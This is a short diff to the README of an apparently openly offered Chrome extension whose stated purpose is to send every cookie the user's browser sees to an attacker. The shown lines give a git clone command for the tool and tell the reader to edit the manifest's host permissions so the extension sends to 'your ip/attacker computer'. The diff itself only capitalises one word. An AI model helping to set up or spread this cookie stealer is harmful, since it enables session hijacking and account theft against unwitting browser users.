@@ -5,7 +5,7 @@ This is a chrome extention that will send all cookies it sees while the user bro
 # How The Heck To Use It:
 Download:  
 ```git clone https://github.com/SteamPunk424/Cookie_Stealer_Chrome_Extension```  
-open manifest.json with nano and change the host permissions to allow the extention to send to your ip/attacker computer:  
+Open manifest.json with nano and change the host permissions to allow the extention to send to your ip/attacker computer:  
 ```
 {
   "manifest_version": 3,
